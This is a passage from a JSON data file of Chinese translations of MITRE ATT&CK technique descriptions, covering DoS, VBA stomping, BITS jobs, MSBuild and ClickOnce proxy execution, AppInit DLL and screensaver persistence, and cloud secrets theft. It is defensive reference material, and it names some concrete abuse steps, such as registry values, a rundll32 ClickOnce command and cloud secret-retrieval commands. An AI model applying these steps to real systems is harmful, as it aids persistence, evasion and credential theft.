        "translated_description": "对手可能会执行端点拒绝服务 (DoS) 攻击，以降低或阻止用户对服务的可用性。端点DoS可以通过耗尽托管这些服务的系统资源或利用系统导致持久崩溃状态来执行。示例服务包括网站、电子邮件服务、DNS和基于Web的应用程序。对手已被观察到出于政治目的进行DoS攻击(引用: FireEye OpPoisonedHandover February 2016)，并支持其他恶意活动，包括分散注意力(引用: FSISAC FraudNetDoS September 2012)、黑客活动和敲诈。(引用: Symantec DDoS October 2014)\n\n端点DoS在不饱和提供访问服务的网络的情况下拒绝服务的可用性。对手可以针对托管用于提供服务的系统上的应用程序堆栈的各个层。这些层包括操作系统 (OS)、服务器应用程序（如Web服务器、DNS服务器、数据库）以及位于其上的（通常是基于Web的）应用程序。攻击每一层需要不同的技术，利用各自组件独特的瓶颈。DoS攻击可以由单个系统或分布在互联网上的多个系统生成，这通常称为分布式DoS (DDoS)。\n\n为了对端点资源执行DoS攻击，多个方面适用于多种方法，包括IP地址欺骗和僵尸网络。\n\n对手可能使用攻击系统的原始IP地址，或伪造源IP地址，使攻击流量更难追溯到攻击系统，或启用反射。这可以通过减少或消除通过网络防御设备的源地址过滤的有效性来增加防御者防御攻击的难度。\n\n僵尸网络通常用于对网络和服务进行DDoS攻击。大型僵尸网络可以从分布在全球互联网的系统生成大量流量。对手可能有资源来构建和控制自己的僵尸网络基础设施，或可能租用现有僵尸网络的时间来进行攻击。在一些最严重的DDoS情况下，使用了如此多的系统来生成请求，以至于每个系统只需发送少量流量即可产生足够的流量来耗尽目标的资源。在这种情况下，将DDoS流量与合法客户端区分开来变得极其困难。僵尸网络已被用于一些最引人注目的DDoS攻击中，例如2012年针对美国主要银行的一系列事件。(引用: USNYAG IranianBotnet March 2016)\n\n在使用流量操纵的攻击中，全球网络中的某些点（如高流量网关路由器）可能会修改数据包，并导致合法客户端执行代码，将网络数据包以高流量指向目标。这种能力以前用于网络审查的目的，其中客户端HTTP流量被修改为包含生成DDoS代码的JavaScript引用，以压倒目标Web服务器。(引用: ArsTechnica Great Firewall of China)\n\n对于试图饱和提供网络的攻击，请参见[网络拒绝服务](https://attack.mitre.org/techniques/T1498)。"
    },
    "Compile After Delivery": {
        "translated_name": "交付后编译",
        "translated_description": "对手可能会尝试通过将文件作为未编译代码交付给受害者，使有效载荷难以发现和分析。基于文本的源代码文件可能会规避针对可执行文件/二进制文件的保护的分析和审查。这些有效载荷在执行之前需要编译；通常通过本机实用程序如ilasm.exe(引用: ATTACK IQ)、csc.exe或GCC/MinGW。(引用: ClearSky MuddyWater Nov 2018)\n\n源代码有效载荷也可能被加密、编码和/或嵌入到其他文件中，例如通过[网络钓鱼](https://attack.mitre.org/techniques/T1566)交付的文件。有效载荷也可能以本机操作系统无法识别且本质上无害的格式交付（例如：macOS/Linux上的EXE），然后在稍后使用捆绑的编译器和执行框架重新编译为适当的可执行二进制文件。(引用: TrendMicro WindowsAppMac)"
    },
    "System Location Discovery": {
        "translated_name": "系统位置发现",
        "translated_description": "对手可能会收集信息，试图计算受害者主机的地理位置。对手可能会使用[系统位置发现](https://attack.mitre.org/techniques/T1614)中的信息，在自动发现期间塑造后续行为，包括对手是否完全感染目标和/或尝试特定操作。\n\n对手可能会尝试使用各种系统检查推断系统的位置，例如时区、键盘布局和/或语言设置。(引用: FBI Ragnar Locker 2020)(引用: Sophos Geolocation 2016)(引用: Bleepingcomputer RAT malware 2020) Windows API函数如<code>GetLocaleInfoW</code>也可用于确定主机的区域设置。(引用: FBI Ragnar Locker 2020) 在云环境中，还可以通过从实例访问实例元数据服务来发现实例的可用区。(引用: AWS Instance Identity Documents)(引用: Microsoft Azure Instance Metadata 2021)\n\n对手还可能尝试使用IP地址推断受害者主机的位置，例如通过在线地理位置IP查找服务。(引用: Securelist Trasparent Tribe 2020)(引用: Sophos Geolocation 2016)"
    },
    "VBA Stomping": {
        "translated_name": "VBA Stomping",
        "translated_description": "对手可能通过用良性数据替换VBA源代码，隐藏嵌入在MS Office文档中的恶意VBA有效载荷。(引用: FireEye VBA stomp Feb 2020)\n\n嵌入VBA内容的MS Office文档将源代码存储在模块流中。每个模块流都有一个<code>PerformanceCache</code>，其中存储了称为p-code的VBA源代码的单独编译版本。当<code>_VBA_PROJECT</code>流（包含VBA项目的版本相关描述）中指定的MS Office版本与主机MS Office应用程序的版本匹配时，将执行p-code。(引用: Evil Clippy May 2019)(引用: Microsoft _VBA_PROJECT Stream)\n\n对手可能通过用零、良性代码或随机字节覆盖VBA源代码位置，同时保留先前编译的恶意p-code来隐藏恶意VBA代码。扫描恶意VBA源代码的工具可能会被绕过，因为不需要的代码隐藏在编译的p-code中。如果删除VBA源代码，一些工具甚至可能认为没有宏存在。如果<code>_VBA_PROJECT</code>流与主机MS Office应用程序之间存在版本匹配，将执行p-code，否则将解压缩并重新编译良性VBA源代码为p-code，从而删除恶意p-code并可能绕过动态分析。(引用: Walmart Roberts Oct 2018)(引用: FireEye VBA stomp Feb 2020)(引用: pcodedmp Bontchev)"
    },
    "BITS Jobs": {
        "translated_name": "BITS 任务",
        "translated_description": "对手可能会滥用 BITS 任务来持续执行代码并执行各种后台任务。Windows 后台智能传输服务 (BITS) 是一种通过 [组件对象模型](https://attack.mitre.org/techniques/T1559/001) (COM) 暴露的低带宽、异步文件传输机制。(引用: Microsoft COM)(引用: Microsoft BITS) BITS 通常用于更新程序、消息传递程序和其他首选在后台运行的应用程序（使用可用的空闲带宽）而不打断其他网络应用程序。文件传输任务作为 BITS 任务实现，其中包含一个或多个文件操作的队列。\n\n创建和管理 BITS 任务的接口可通过 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 和 [BITSAdmin](https://attack.mitre.org/software/S0190) 工具访问。(引用: Microsoft BITS)(引用: Microsoft BITSAdmin)\n\n对手可能会滥用 BITS 下载（例如 [入口工具传输](https://attack.mitre.org/techniques/T1105)）、执行甚至在运行恶意代码后进行清理（例如 [指标移除](https://attack.mitre.org/techniques/T1070)）。BITS 任务是自包含的 BITS 任务数据库，没有新文件或注册表修改，并且通常被主机防火墙允许。(引用: CTU BITS Malware June 2016)(引用: Mondok Windows PiggyBack BITS May 2007)(引用: Symantec BITS May 2007) BITS 启用的执行还可以通过创建长期任务（默认最大寿命为 90 天且可扩展）或在任务完成或出错时调用任意程序（包括系统重启后）来实现持久性。(引用: PaloAlto UBoatRAT Nov 2017)(引用: CTU BITS Malware June 2016)\n\nBITS 上传功能也可用于执行 [通过替代协议外传](https://attack.mitre.org/techniques/T1048)。(引用: CTU BITS Malware June 2016)"
    },
    "MSBuild": {
        "translated_name": "MSBuild",
        "translated_description": "对手可能会使用 MSBuild 通过受信任的 Windows 实用程序代理执行代码。MSBuild.exe（Microsoft 构建引擎）是 Visual Studio 使用的软件构建平台。它处理 XML 格式的项目文件，这些文件定义了加载和构建各种平台和配置的要求。(引用: MSDN MSBuild)\n\n对手可以滥用 MSBuild 代理执行恶意代码。MSBuild 引入的内联任务功能允许将 C# 或 Visual Basic 代码插入到 XML 项目文件中。(引用: MSDN MSBuild)(引用: Microsoft MSBuild Inline Tasks 2017) MSBuild 将编译并执行内联任务。MSBuild.exe 是一个签名的 Microsoft 二进制文件，因此当以这种方式使用时，它可以执行任意代码并绕过配置为允许 MSBuild.exe 执行的应用程序控制防御。(引用: LOLBAS Msbuild)"
    },
    "Impersonation": {
        "translated_name": "冒充",
        "translated_description": "对手可能会冒充受信任的人或组织，以说服和欺骗目标代表他们执行某些操作。例如，对手可能会在冒充已知发送者（如高管、同事或第三方供应商）的情况下与受害者沟通（通过 [钓鱼获取信息](https://attack.mitre.org/techniques/T1598)、[网络钓鱼](https://attack.mitre.org/techniques/T1566) 或 [内部鱼叉式网络钓鱼](https://attack.mitre.org/techniques/T1534)）。建立的信任可以被用来实现对手的最终目标，可能针对多个受害者。\n\n在许多商业电子邮件妥协或电子邮件欺诈活动中，对手使用冒充来欺骗受害者——欺骗他们发送资金或透露信息，从而最终实现 [财务盗窃](https://attack.mitre.org/techniques/T1657)。\n\n对手通常还会使用社会工程技术，例如在电子邮件主题行和正文文本中使用操纵性和说服性语言，如“付款”、“请求”或“紧急”，以推动受害者在恶意活动被检测到之前迅速采取行动。这些活动通常专门针对由于工作角色和/或访问权限而能够执行对手目标的人。\n\n冒充通常由侦察技术（如 [收集受害者身份信息](https://attack.mitre.org/techniques/T1589) 和 [收集受害者组织信息](https://attack.mitre.org/techniques/T1591)）以及获取基础设施（如电子邮件域名（即 [域名](https://attack.mitre.org/techniques/T1583/001)））来支持其虚假身份。(引用: CrowdStrike-BEC)\n\n在涉及冒充的活动中可能会有多个受害者。例如，对手可能会 [妥协账户](https://attack.mitre.org/techniques/T1586) 针对一个组织，然后可以用来支持对其他实体的冒充。(引用: VEC)"
    },
    "Modify Cloud Compute Configurations": {
        "translated_name": "修改云计算配置",
        "translated_description": "对手可能会修改直接影响云计算基础设施的大小、位置和可用资源的设置，以规避防御。这些设置可能包括服务配额、订阅关联、租户范围的策略或其他影响可用计算的配置。此类修改可能允许对手滥用受害者的计算资源来实现其目标，可能不会影响正在运行的实例的执行和/或暴露其活动。\n\n例如，云提供商通常通过配额限制客户使用计算资源。客户可以请求调整这些配额以支持增加的计算需求，尽管这些调整可能需要云提供商的批准。对手在妥协云环境后也可能会请求配额调整，以支持其活动，例如在不引起怀疑的情况下启用额外的 [资源劫持](https://attack.mitre.org/techniques/T1496)。(引用: Microsoft Cryptojacking 2023) 对手还可能通过修改任何限制部署虚拟机大小的租户范围策略来增加允许的资源使用量。(引用: Microsoft Azure Policy)\n\n对手还可能修改影响云资源部署位置的设置，例如启用 [未使用/不受支持的云区域](https://attack.mitre.org/techniques/T1535)。"
    },
    "Domain Fronting": {
        "translated_name": "域前置",
        "translated_description": "对手可能会利用内容分发网络 (CDN) 和其他托管多个域的服务中的路由方案来混淆 HTTPS 流量或通过 HTTPS 隧道传输的流量的预期目的地。(引用: Fifield Blocking Resistent Communication through domain fronting 2015) 域前置涉及在 TLS 头的 SNI 字段和 HTTP 头的 Host 字段中使用不同的域名。如果两个域都由同一个 CDN 提供服务，那么 CDN 可能会在解包 TLS 头后将流量路由到 HTTP 头中指定的地址。一种变体技术“无域前置”使用空白的 SNI 字段；这可能允许前置工作，即使 CDN 尝试验证 SNI 和 HTTP Host 字段是否匹配（如果忽略空白 SNI 字段）。\n\n例如，如果 domain-x 和 domain-y 是同一个 CDN 的客户，则可以在 TLS 头中放置 domain-x，在 HTTP 头中放置 domain-y。流量看起来是去往 domain-x，但 CDN 可能会将其路由到 domain-y。"
    },
    "ARP Cache Poisoning": {
        "translated_name": "ARP 缓存中毒",
        "translated_description": "对手可能会毒害地址解析协议 (ARP) 缓存，以将自己置于两个或多个网络设备的通信之间。这种活动可用于启用后续行为，例如 [网络嗅探](https://attack.mitre.org/techniques/T1040) 或 [传输数据篡改](https://attack.mitre.org/techniques/T1565/002)。\n\nARP 协议用于将 IPv4 地址解析为链路层地址，例如媒体访问控制 (MAC) 地址。(引用: RFC826 ARP) 本地网络段中的设备通过使用链路层地址进行通信。如果网络设备没有特定网络设备的链路层地址，它可能会向本地网络发送广播 ARP 请求，以将 IP 地址转换为 MAC 地址。具有相关 IP 地址的设备直接回复其 MAC 地址。发出 ARP 请求的网络设备将使用并存储该信息在其 ARP 缓存中。\n\n对手可能会被动等待 ARP 请求来毒害请求设备的 ARP 缓存。对手可能会回复他们的 MAC 地址，从而欺骗受害者，使其相信他们正在与预期的网络设备通信。为了毒害 ARP 缓存，对手的回复必须比合法 IP 地址所有者的回复更快。对手还可能发送一个免费的 ARP 回复，恶意宣布拥有特定 IP 地址给本地网络段中的所有设备。\n\nARP 协议是无状态的，不需要身份验证。因此，设备可能会错误地将 IP 地址的 MAC 地址添加或更新到其 ARP 缓存中。(引用: Sans ARP Spoofing Aug 2003)(引用: Cylance Cleaver)\n\n对手可能会使用 ARP 缓存中毒作为拦截网络流量的一种手段。这种活动可用于收集和/或中继数据，例如通过不安全、未加密协议发送的凭据。(引用: Sans ARP Spoofing Aug 2003)"
    },
    "Disable or Modify Cloud Logs": {
        "translated_name": "禁用或修改云日志",
        "translated_description": "对手可能会禁用或修改云日志记录功能和集成，以限制其活动的数据收集并避免检测。云环境允许收集和分析审计和应用程序日志，这些日志提供了用户在环境中执行的活动的洞察。如果对手拥有足够的权限，他们可以禁用或修改日志记录以避免检测其活动。\n\n例如，在 AWS 中，对手可能会在进行进一步的恶意活动之前禁用 CloudWatch/CloudTrail 集成。(引用: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) 他们也可能篡改日志记录功能——例如，通过删除任何关联的 SNS 主题、禁用多区域日志记录或禁用验证和/或加密日志文件的设置。(引用: AWS Update Trail)(引用: Pacu Detection Disruption Module) 在 Office 365 中，对手可能会使用 `Set-MailboxAuditBypassAssociation` cmdlet 禁用特定用户的邮件收集活动日志记录，禁用 M365 高级审计，或将用户的许可证从企业 E5 降级到企业 E3 许可证。(引用: Dark Reading Microsoft 365 Attacks 2021)"
    },
    "Security Software Discovery": {
        "translated_name": "安全软件发现",
        "translated_description": "对手可能会尝试获取系统或云环境中安装的安全软件、配置、防御工具和传感器的列表。这可能包括云监控代理和防病毒软件等内容。对手可能会在自动发现期间使用[安全软件发现](https://attack.mitre.org/techniques/T1518/001)中的信息来塑造后续行为，包括对手是否完全感染目标和/或尝试特定操作。\n\n可以用来获取安全软件信息的示例命令有[netsh](https://attack.mitre.org/software/S0108)、使用[Reg](https://attack.mitre.org/software/S0075)的<code>reg query</code>、使用[cmd](https://attack.mitre.org/software/S0106)的<code>dir</code>和[Tasklist](https://attack.mitre.org/software/S0057)，但其他发现行为的指标可能更具体地指向对手正在寻找的软件或安全系统类型。越来越常见的是看到macOS恶意软件执行对LittleSnitch和KnockKnock软件的检查。\n\n对手还可能利用[云API](https://attack.mitre.org/techniques/T1059/009)来发现安装在计算基础设施上的云原生安全软件，例如AWS CloudWatch代理、Azure VM代理和Google Cloud Monitor代理。这些代理可能从VM中收集指标和日志，并集中聚合在云监控平台中。"
    },
    "Hidden Window": {
        "translated_name": "隐藏窗口",
        "translated_description": "对手可能会使用隐藏窗口来隐藏恶意活动，使其不被用户察觉。在某些情况下，应用程序执行操作时通常会显示的窗口可以被隐藏。系统管理员可能会利用这些功能在执行管理任务时避免打扰用户工作环境。\n\n对手可能会滥用这些功能来隐藏用户通常可见的窗口，以免用户察觉到对手在系统上的活动。(引用: Antiquated Mac Malware)\n\n在macOS上，应用程序运行的配置列在属性列表（plist）文件中。这些文件中的一个标签可以是<code>apple.awt.UIElement</code>，允许Java应用程序防止应用程序图标出现在Dock中。一个常见的用途是当应用程序在系统托盘中运行，但不希望也出现在Dock中。\n\n类似地，在Windows上，脚本语言（如[PowerShell](https://attack.mitre.org/techniques/T1059/001)、Jscript和[Visual Basic](https://attack.mitre.org/techniques/T1059/005)）中有各种功能可以使窗口隐藏。一个示例是<code>powershell.exe -WindowStyle Hidden</code>。(引用: PowerShell About 2019)\n\n此外，Windows支持`CreateDesktop()` API，可以创建一个隐藏的桌面窗口及其对应的<code>explorer.exe</code>进程。(引用: Hidden VNC)(引用: Anatomy of an hVNC Attack) 在隐藏桌面窗口上运行的所有应用程序（如隐藏的VNC（hVNC）会话）(引用: Hidden VNC)将对其他桌面窗口不可见。"
    },
    "ClickOnce": {
        "translated_name": "ClickOnce",
        "translated_description": "对手可能会使用ClickOnce应用程序（.appref-ms和.application文件）通过受信任的Windows实用程序代理执行代码。(引用: Burke/CISA ClickOnce BlackHat) ClickOnce是一种部署方式，使用户能够创建自更新的基于Windows的.NET应用程序（即.XBAP、.EXE或.DLL），这些应用程序从文件共享或网页安装和运行，用户交互最少。应用程序作为DFSVC.EXE的子进程启动，DFSVC.EXE负责安装、启动和更新应用程序。(引用: SpectorOps Medium ClickOnce)\n\n由于ClickOnce应用程序仅获得有限的权限，因此它们不需要管理员权限即可安装。(引用: Microsoft Learn ClickOnce) 因此，对手可能会滥用ClickOnce来代理执行恶意代码，而无需提升权限。\n\nClickOnce可能会以多种方式被滥用。例如，对手可能依赖[用户执行](https://attack.mitre.org/techniques/T1204)。当用户访问恶意网站时，.NET恶意软件伪装成合法软件，并显示ClickOnce弹出窗口以进行安装。(引用: NetSPI ClickOnce)\n\n对手还可能滥用ClickOnce通过[Rundll32](https://attack.mitre.org/techniques/T1218/011)脚本执行恶意软件，使用命令`rundll32.exe dfshim.dll,ShOpenVerbApplication1`。(引用: LOLBAS /Dfsvc.exe)\n\n此外，对手可以将ClickOnce应用程序文件移动到远程用户的启动文件夹，以继续部署恶意代码（即[注册表运行键/启动文件夹](https://attack.mitre.org/techniques/T1547/001)）。(引用: Burke/CISA ClickOnce BlackHat)(引用: Burke/CISA ClickOnce Paper)"
    },
    "Python": {
        "translated_name": "Python",
        "translated_description": "对手可能会滥用Python命令和脚本进行执行。Python是一种非常流行的脚本/编程语言，具有执行许多功能的能力。Python可以通过命令行交互式执行（通过<code>python.exe</code>解释器）或通过脚本（.py）编写并分发到不同系统。Python代码还可以编译成二进制可执行文件。(引用: Zscaler APT31 Covid-19 October 2020)\n\nPython附带许多内置包，可以与底层系统交互，例如文件操作和设备I/O。对手可以使用这些库下载和执行命令或其他脚本，以及执行各种恶意行为。"
    },
    "Relocate Malware": {
        "translated_name": "重新定位恶意软件",
        "translated_description": "一旦有效载荷被交付，对手可能会在受害者系统上复制相同恶意软件的副本，以删除其存在的证据和/或避免防御。将恶意软件有效载荷复制到新位置也可以与[文件删除](https://attack.mitre.org/techniques/T1070/004)结合使用，以清理旧的工件。\n\n重新定位恶意软件可能是许多旨在规避防御的操作的一部分。例如，对手可能会复制并重命名有效载荷，以更好地融入本地环境（即[匹配合法名称或位置](https://attack.mitre.org/techniques/T1036/005)）。(引用: DFIR Report Trickbot June 2023) 有效载荷还可以重新定位到目标[文件/路径排除](https://attack.mitre.org/techniques/T1564/012)以及与建立[持久性](https://attack.mitre.org/tactics/TA0003)相关的特定位置。(引用: Latrodectus APR 2024)\n\n重新定位恶意有效载荷还可能阻碍防御分析，特别是将这些有效载荷与早期事件（如[用户执行](https://attack.mitre.org/techniques/T1204)和[网络钓鱼](https://attack.mitre.org/techniques/T1566)）分开，这些事件可能已生成警报或以其他方式引起防御者的注意。"
    },
    "Identify Roles": {
        "translated_name": "识别角色",
        "translated_description": "对手可能会收集有关受害者组织中身份和角色的信息，以在目标过程中使用。有关业务角色的信息可能会揭示各种可目标化的详细信息，包括关键人员的可识别信息以及他们可以访问的数据/资源。\n\n对手可能会通过各种方式收集这些信息，例如通过[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)进行直接引诱。有关业务角色的信息也可能通过在线或其他可访问的数据集（例如：[社交媒体](https://attack.mitre.org/techniques/T1593/001)或[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)）暴露给对手。(引用: ThreatPost Broadvoice Leak) 收集这些信息可能会揭示其他形式的侦察机会（例如[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)或[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如[建立账户](https://attack.mitre.org/techniques/T1585)或[妥协账户](https://attack.mitre.org/techniques/T1586)），和/或初始访问（例如[网络钓鱼](https://attack.mitre.org/techniques/T1566)）。"
    },
    "Data Encoding": {
        "translated_name": "数据编码",
        "translated_description": "对手可能会对数据进行编码，以使命令和控制流量的内容更难检测。命令和控制（C2）信息可以使用标准数据编码系统进行编码。使用数据编码可能符合现有协议规范，包括使用ASCII、Unicode、Base64、MIME或其他二进制到文本和字符编码系统。(引用: Wikipedia Binary-to-text Encoding) (引用: Wikipedia Character Encoding) 一些数据编码系统还可能导致数据压缩，例如gzip。"
    },
    "AppInit DLLs": {
        "translated_name": "AppInit DLLs",
        "translated_description": "对手可能通过执行由AppInit DLLs加载到进程中的恶意内容来建立持久性和/或提升权限。指定在注册表键<code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code>或<code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code>中的<code>AppInit_DLLs</code>值的动态链接库（DLL）由user32.dll加载到每个加载user32.dll的进程中。实际上，这几乎是每个程序，因为user32.dll是一个非常常见的库。(引用: Elastic Process Injection July 2017)\n\n类似于进程注入，这些值可以被滥用，通过导致恶意DLL被加载并在计算机上的单独进程上下文中运行来获得提升的权限。(引用: AppInit Registry) 恶意AppInit DLLs还可以通过API活动的持续触发提供持久性。\n\n在启用安全启动的情况下，AppInit DLL功能在Windows 8及更高版本中被禁用。(引用: AppInit Secure Boot)"
    },
    "Phishing for Information": {
        "translated_name": "钓鱼获取信息",
        "translated_description": "对手可能会发送钓鱼消息以获取可在目标过程中使用的敏感信息。钓鱼获取信息是试图欺骗目标透露信息，通常是凭证或其他可操作的信息。钓鱼获取信息不同于[网络钓鱼](https://attack.mitre.org/techniques/T1566)，因为目标是从受害者那里收集数据，而不是执行恶意代码。\n\n所有形式的钓鱼都是电子传递的社会工程。钓鱼可以是有针对性的，称为鱼叉式网络钓鱼。在鱼叉式网络钓鱼中，对手将针对特定个人、公司或行业。更一般地，对手可以进行非针对性的钓鱼，例如大规模凭证收集活动。\n\n对手还可能尝试通过电子邮件、即时消息或其他电子对话方式直接获取信息。(引用: ThreatPost Social Media Phishing)(引用: TrendMictro Phishing)(引用: PCMag FakeLogin)(引用: Sophos Attachment)(引用: GitHub Phishery) 受害者还可能收到钓鱼消息，指示他们拨打电话号码，对手在电话中尝试收集机密信息。(引用: Avertium callback phishing)\n\n钓鱼获取信息通常涉及社会工程技术，例如冒充有理由收集信息的来源（例如[建立账户](https://attack.mitre.org/techniques/T1585)或[妥协账户](https://attack.mitre.org/techniques/T1586)）和/或发送多个看似紧急的消息。另一种实现此目的的方法是伪造或欺骗(引用: Proofpoint-spoof)发件人的身份，这可以用来欺骗人类接收者以及自动化安全工具。(引用: cyberproof-double-bounce)\n\n钓鱼获取信息还可能涉及规避技术，例如删除或操纵被滥用发送消息的被破坏账户的电子邮件或元数据/头部（例如，[电子邮件隐藏规则](https://attack.mitre.org/techniques/T1564/008)）。(引用: Microsoft OAuth Spam 2022)(引用: Palo Alto Unit 42 VBA Infostealer 2014)"
    },
    "Resource Hijacking": {
        "translated_name": "资源劫持",
        "translated_description": "对手可能会利用被劫持系统的资源来完成资源密集型任务，这可能会影响系统和/或托管服务的可用性。\n\n资源劫持可能采取多种不同的形式。例如，对手可能会：\n\n* 利用计算资源进行加密货币挖矿\n* 将网络带宽出售给代理网络\n* 生成SMS流量以获取利润\n* 滥用基于云的消息服务发送大量垃圾邮件\n\n在某些情况下，对手可能会同时利用多种资源劫持类型。(引用: Sysdig Cryptojacking Proxyjacking 2023)"
    },
    "Establish Accounts": {
        "translated_name": "建立账户",
        "translated_description": "对手可能会创建和培养可以在目标过程中使用的服务账户。对手可以创建账户，用于建立一个身份以进一步操作。身份开发包括开发公共信息、存在、历史和适当的关联。这种开发可以应用于社交媒体、网站或其他可以在操作过程中引用和审查以验证其合法性的信息。(引用: NEWSCASTER2014)(引用: BlackHatRobinSage)\n\n对于包含社会工程的操作，使用在线身份可能很重要。这些身份可能是虚构的或冒充真实的人。身份可能存在于单个站点或多个站点（例如：Facebook、LinkedIn、Twitter、Google、GitHub、Docker Hub等）。建立身份可能需要开发额外的文档，使其看起来真实。这可能包括填写个人资料信息、发展社交网络或包含照片。(引用: NEWSCASTER2014)(引用: BlackHatRobinSage)\n\n建立账户还可以包括创建电子邮件提供商的账户，这些账户可能直接用于[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)或[网络钓鱼](https://attack.mitre.org/techniques/T1566)。(引用: Mandiant APT1) 此外，建立账户可能允许对手滥用免费服务，例如注册试用期以[获取基础设施](https://attack.mitre.org/techniques/T1583)用于恶意目的。(引用: Free Trial PurpleUrchin)\n"
    },
    "Obtain Capabilities": {
        "translated_name": "获取能力",
        "translated_description": "对手可能会购买和/或窃取可以在目标过程中使用的能力。与其在内部开发自己的能力，对手可能会购买、免费下载或窃取它们。活动可能包括获取恶意软件、软件（包括许可证）、漏洞利用、证书和与漏洞相关的信息。对手可能会获取能力以支持其在对手生命周期中的各个阶段的操作。\n\n除了从互联网上下载免费恶意软件、软件和漏洞利用外，对手还可能从第三方实体购买这些能力。第三方实体可以包括专门从事恶意软件和漏洞利用的技术公司、犯罪市场或个人。(引用: NationsBuying)(引用: PegasusCitizenLab)\n\n除了购买能力外，对手还可能从第三方实体（包括其他对手）窃取能力。这可能包括窃取软件许可证、恶意软件、SSL/TLS和代码签名证书，或袭击封闭的漏洞或漏洞利用数据库。(引用: DiginotarCompromise)"
    },
    "Screensaver": {
        "translated_name": "屏幕保护程序",
        "translated_description": "对手可能通过执行由用户不活动触发的恶意内容来建立持久性。屏幕保护程序是在用户不活动的可配置时间后执行的程序，由具有.scr文件扩展名的可移植可执行文件（PE）组成。(引用: Wikipedia Screensaver) Windows屏幕保护程序应用程序scrnsave.scr位于<code>C:\\Windows\\System32\\</code>和64位Windows系统上的<code>C:\\Windows\\sysWOW64\\</code>，以及基本Windows安装中包含的屏幕保护程序。\n\n以下屏幕保护程序设置存储在注册表中（<code>HKCU\\Control Panel\\Desktop\\</code>），可以被操纵以实现持久性：\n\n* <code>SCRNSAVE.exe</code> - 设置为恶意PE路径\n* <code>ScreenSaveActive</code> - 设置为'1'以启用屏幕保护程序\n* <code>ScreenSaverIsSecure</code> - 设置为'0'以不要求密码解锁\n* <code>ScreenSaveTimeout</code> - 设置用户不活动超时以执行屏幕保护程序\n\n对手可以使用屏幕保护程序设置通过在用户不活动的某个时间后运行恶意软件来保持持久性。(引用: ESET Gazer Aug 2017)"
    },
    "Conditional Access Policies": {
        "translated_name": "条件访问策略",
        "translated_description": "对手可能会禁用或修改条件访问策略，以确保对被破坏账户的持久访问。条件访问策略是身份提供者和身份和访问管理系统用于确定用户是否应被授予资源访问权限的额外验证。\n\n例如，在Entra ID、Okta和JumpCloud中，可以根据用户的IP地址、设备注册状态和多因素认证的使用情况拒绝用户访问应用程序。(引用: Microsoft Conditional Access)(引用: JumpCloud Conditional Access Policies)(引用: Okta Conditional Access Policies) 在某些情况下，身份提供者还可能支持使用基于风险的指标，根据各种指标拒绝登录。在AWS和GCP中，IAM策略可以包含`condition`属性，以验证任意约束，例如源IP、请求日期以及请求的资源或区域的性质。(引用: AWS IAM Conditions)(引用: GCP IAM Conditions) 这些措施有助于防止被破坏的凭据导致未经授权的数据或资源访问，并将用户权限限制在仅所需的权限。\n\n通过修改条件访问策略，例如添加额外的受信任IP范围、删除[多因素认证](https://attack.mitre.org/techniques/T1556/006)要求或允许额外的[未使用/不受支持的云区域](https://attack.mitre.org/techniques/T1535)，对手可能能够确保对账户的持久访问并规避防御措施。"
    },
    "Create Cloud Instance": {
        "translated_name": "创建云实例",
        "translated_description": "对手可能会在云账户的计算服务中创建一个新实例或虚拟机（VM），以规避防御。创建新实例可能允许对手绕过当前账户中实例上存在的防火墙规则和权限。对手可能会[创建快照](https://attack.mitre.org/techniques/T1578/001)一个或多个账户中的卷，创建一个新实例，挂载快照，然后应用一个较少限制的安全策略，以收集[本地系统数据](https://attack.mitre.org/techniques/T1005)或进行[远程数据暂存](https://attack.mitre.org/techniques/T1074/002)。(引用: Mandiant M-Trends 2020)\n\n创建新实例还可能允许对手在环境中进行恶意活动，而不影响当前运行实例的执行。"
    },
    "Cloud Secrets Management Stores": {
        "translated_name": "云秘密管理存储",
        "translated_description": "对手可能会从云原生秘密管理解决方案（如AWS Secrets Manager、GCP Secret Manager、Azure Key Vault和Terraform Vault）中获取凭据。\n\n秘密管理器支持密码、API密钥和其他凭据材料的安全集中管理。在使用秘密管理器的情况下，云服务可以通过API请求动态获取凭据，而不是访问不安全地存储在纯文本文件或环境变量中的秘密。\n\n如果对手能够在云环境中获得足够的权限——例如，通过获取高权限的[云账户](https://attack.mitre.org/techniques/T1078/004)的凭据或破坏有权限检索秘密的服务——他们可能能够从秘密管理器请求秘密。这可以通过AWS中的`get-secret-value`、GCP中的`gcloud secrets describe`和Azure中的`az key vault secret show`命令来实现。(引用: Permiso Scattered Spider 2023)(引用: Sysdig ScarletEel 2.0 2023)(引用: AWS Secrets Manager)(引用: Google Cloud Secrets)(引用: Microsoft Azure Key Vault)\n\n**注意：** 此技术与[云实例元数据API](https://attack.mitre.org/techniques/T1552/005)不同，因为凭据是直接从云秘密管理器请求的，而不是通过实例元数据API。"
    },
    "Transmitted Data Manipulation": {
        "translated_name": "传输数据篡改",
        "translated_description": "对手可能会在数据传输到存储或其他系统的过程中篡改数据，以影响外部结果或隐藏活动，从而威胁数据的完整性。(引用: FireEye APT38 Oct 2018)(引用: DOJ Lazarus Sony 2018) 通过篡改传输的数据，对手可能试图影响业务流程、组织理解和决策。\n\n篡改可能通过网络连接或系统进程之间进行，在有机会部署工具拦截和更改信息的地方。修改的类型及其影响取决于目标传输机制以及对手的目标和目的。对于复杂系统，对手可能需要特殊的专业知识，并可能需要通过长期的信息收集活动获得与系统相关的专业软件，以实现预期的影响。"
    },
    "/etc/passwd and /etc/shadow": {
        "translated_name": "/etc/passwd 和 /etc/shadow",
